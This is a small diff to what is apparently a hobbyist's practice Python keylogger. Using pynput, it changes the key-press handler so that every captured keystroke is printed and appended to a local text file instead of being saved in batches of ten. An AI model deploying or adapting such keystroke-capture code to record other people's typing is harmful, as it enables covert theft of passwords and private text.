@@ -10,14 +10,17 @@ from pynput.keyboard import Key, Listener
 count = 0
 keys = []
 
-def press(key):
+def press(key): # Left these as Comments because it prints <255> continuously.
     global keys, count
     keys.append(key)
-    count += 1
+    #count += 1
+    if key == '<255>':
+        print(None)
     print(key)
-    if count >= 10:
-        count = 0 
-        save(keys) 
+    save(keys)
+    #if count >= 10:
+    #    count = 0 
+    #    save(keys) 
 
 def save(keys):
     with open(r"C:\Users\Flores\Joey-vscode-workspaces\Python-Practice\.projects\.completed\keylogger\save.txt", "a") as file:
